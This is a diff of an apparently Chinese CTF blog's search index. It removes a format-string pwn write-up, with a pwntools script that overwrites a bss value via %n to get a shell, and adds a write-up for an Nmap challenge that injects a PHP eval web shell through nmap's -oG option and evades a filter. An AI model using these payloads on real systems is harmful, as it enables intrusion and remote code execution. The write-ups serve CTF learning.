-<p>使用AAAA %08x %08x %8x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x 去测量，空格作为分隔符。AAAA的ASCII码就是414141，而41414141在第10个（1开始）偏移量为10。</p>
-<p>使用%n来写入到bss段，覆盖随机值，这里使用dd双字来声明，也就是双字，4个字节。</p>
-<p><img src="/PWN5/PWN5(3).png"></p>
-<p>构造payload</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding = utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;local:1/remote:2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">select = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> select == <span class="number">2</span>:</span><br><span class="line"></span><br><span class="line">​    p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26980</span>)</span><br><span class="line"></span><br><span class="line">payload=p32(<span class="number">0x804c044</span>)+p32(<span class="number">0x804c045</span>)+p32(<span class="number">0x804c046</span>)+p32(<span class="number">0x804c047</span>)    //%n默认写入的是<span class="number">4</span>个字节，因此需要<span class="number">4</span>个地址    </span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;%10$n%11$n%12$n%13$n&#x27;</span>     //%&lt;偏移&gt;$n  用于写入到前面地址的内容</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x10101010</span>))       //也就是十进制的<span class="number">269488144</span>，它是把写入的内容连起来。</span><br><span class="line"></span><br><span class="line">//这里输入<span class="number">4</span>个<span class="number">0x10</span>是因为我们payload的地址部分，不是格式化打印部分写入了<span class="number">16</span>长度的内容，一个p32函数转了<span class="number">4</span>个字符的地址</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>payload2，这次只通过%n一次性输入4个字节把dd的四个字节全部覆盖了。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26980</span>)</span><br><span class="line"></span><br><span class="line">unk_804C044_addr=<span class="number">0x0804C044</span></span><br><span class="line"></span><br><span class="line">payload=p32(unk_804C044_addr)+<span class="string">&#x27;%10$n&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<p>总结本题的思路，首先是通过%08x这种方式打印，找到输出字符的偏移量，然后找出随机值的bss段地址，使用%xx$n赋值到该段地址中，然后输入与%n相对应的值，得到shell，在根目录上找到flag。</p>
-]]></content>
-      <categories>
-        <category>pwn</category>
-      </categories>
-      <tags>
-        <tag>32bit</tag>
-        <tag>写bss</tag>
-        <tag>格式化字符串漏</tag>
       </tags>
   </entry>
   <entry>
@@ -699,6 +668,37 @@
       </categories>
       <tags>
         <tag>总结</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网鼎杯2020朱雀组-Nmap</title>
+    <url>/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap/</url>
+    <content><![CDATA[<ol>
+<li>打开页面</li>
+</ol>
+<p><img src="/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Y2K5p2v6Zuo5rC05pWs6L-H5a6i,size_20,color_FFFFFF,t_70,g_se,x_16-20220718172428863.png" alt="img"></p>
+<p> 2.利用<a href="https://so.csdn.net/so/search?q=NMAP&spm=1001.2101.3001.7020">NMAP</a>里的-oG命令实现代码的写入，那我们这里就可以尝试构造payload，来利用‘拼接，写入我们想要的shell文件</p>
+<p>我们直接用那道buu里的payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt; -oG zhuque.php&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>注入之后发现存在过滤，fuzz,过滤了php</p>
+<p>（1）利用&lt;?&#x3D;来代替&lt;?php进行绕过<br>（2）利用phtml来代替shell.php的文件后缀</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&lt;?= eval($_POST[&quot;cmd&quot;]);?&gt; -oG zhuque.phtml&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Y2K5p2v6Zuo5rC05pWs6L-H5a6i,size_20,color_FFFFFF,t_70,g_se,x_16-20220718172548382.png" alt="img"></p>
+<p> 上传成功</p>
+<p>3.打开蚁剑</p>
+<p><img src="/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Y2K5p2v6Zuo5rC05pWs6L-H5a6i,size_19,color_FFFFFF,t_70,g_se,x_16.png" alt="img"></p>
+<p> 在根目录下找到flag</p>
+<p><img src="/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Y2K5p2v6Zuo5rC05pWs6L-H5a6i,size_20,color_FFFFFF,t_70,g_se,x_16-20220718172608276.png" alt="img"></p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>命令注入</tag>
+        <tag>nmap</tag>
       </tags>
   </entry>
 </search>
